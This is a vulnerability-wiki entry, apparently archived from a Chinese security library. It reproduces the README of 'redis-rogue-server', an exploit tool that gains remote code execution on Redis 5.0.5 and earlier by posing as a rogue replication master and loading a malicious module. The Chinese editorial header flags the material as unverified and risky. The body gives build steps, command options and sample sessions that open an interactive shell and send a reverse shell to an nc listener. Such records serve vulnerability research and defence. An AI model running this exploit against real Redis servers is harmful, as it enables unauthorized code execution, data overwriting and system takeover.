---
source: "白阁文库 BaizeSec/bylibrary"
title: "Redis Rogue Server"
product: "Redis复制/模块加载管理能力"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "模块功能可用（4+）、可执行复制/CONFIG/MODULE命令、目标可连恶意主机并加载匹配架构.so，非所有无认证Redis均满足"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-e97514964933f08ba2b5c842"
entity_id: "ve-e97514964933f08ba2b5c842"
schema_version: "1"
---

# Redis Rogue Server

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：模块功能可用（4+）、可执行复制/CONFIG/MODULE命令、目标可连恶意主机并加载匹配架构.so，非所有无认证Redis均满足
- 证据范围：工具使用文档应与漏洞实体分离；<=5.0.5没有4.0下界且未说明5.0.6变化，不能当通用影响范围。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- github获取文件却没有本工具仓库链接，只有依赖模块链接
- 复制角色/持久化文件名变更可能导致同步覆盖数据，不是单纯检查，日志temporary cleaning不能证明完全恢复
- 缺目标系统/架构、原始主从配置备份及模块卸载验证
- 与465/466同复制模块链，保留工具差异不重复计漏洞

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

A exploit for Redis(<=5.0.5) RCE, inspired by [Redis post-exploitation](https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf).

__Support interactive shell and reverse shell!__

**github获取文件**

## Requirements

Python 3.6+

If you want to modify or recompile the redis module, you also require `make`.

## Usage

Compile exploit:

``` bash
cd RedisModulesSDK/exp/
make
```

Copy the .so file to same folder with `redis-rogue-server.py`.

```
➜ ./redis-rogue-server.py -h
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

Usage: redis-rogue-server.py [options]

Options:
  -h, --help           show this help message and exit
  --rhost=REMOTE_HOST  target host
  --rport=REMOTE_PORT  target redis port, default 6379
  --lhost=LOCAL_HOST   rogue server ip
  --lport=LOCAL_PORT   rogue server listen port, default 21000
  --exp=EXP_FILE       Redis Module to load, default exp.so
  -v, --verbose        Show full data stream
```

## Example

### Interactive shell

```
➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
______         _ _      ______                         _____                          
| ___ \       | (_)     | ___ \                       /  ___|                         
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __ 
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |   
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|   
                                     __/ |                                            
                                    |___/                                             
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: i
[info] Interact mode start, enter "exit" to quit.
[<<] whoami
[>>] :n0b0dy
[<<] 
```

### Reverse shell

Invoke reverse shell:

```
➜ ./redis-rogue-server.py --rhost 127.0.0.1 --lhost 127.0.0.1
______         _ _      ______                         _____
| ___ \       | (_)     | ___ \                       /  ___|
| |_/ /___  __| |_ ___  | |_/ /___   __ _ _   _  ___  \ `--.  ___ _ ____   _____ _ __
|    // _ \/ _` | / __| |    // _ \ / _` | | | |/ _ \  `--. \/ _ \ '__\ \ / / _ \ '__|
| |\ \  __/ (_| | \__ \ | |\ \ (_) | (_| | |_| |  __/ /\__/ /  __/ |   \ V /  __/ |
\_| \_\___|\__,_|_|___/ \_| \_\___/ \__, |\__,_|\___| \____/ \___|_|    \_/ \___|_|
                                     __/ |
                                    |___/
@copyright n0b0dy @ r3kapig

[info] TARGET 127.0.0.1:6379
[info] SERVER 127.0.0.1:21000
[info] Setting master...
[info] Setting dbfilename...
[info] Loading module...
[info] Temerory cleaning up...
What do u want, [i]nteractive shell or [r]everse shell: r
[info] Open reverse shell...
Reverse server address: 127.0.0.1
Reverse server port: 9999
[info] Reverse shell payload sent.
[info] Check at 127.0.0.1:9999
[info] Unload module...
```

Receive reverse shell:

```
➜ nc -lvvp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from localhost.localdomain 39312 received!
whoami
n0b0dy
```

## Thanks

* [RicterZ](https://github.com/RicterZ)'s redis exec module: <https://github.com/RicterZ/RedisModules-ExecuteCommand>


---

> 来源：白阁文库 BaizeSec/bylibrary
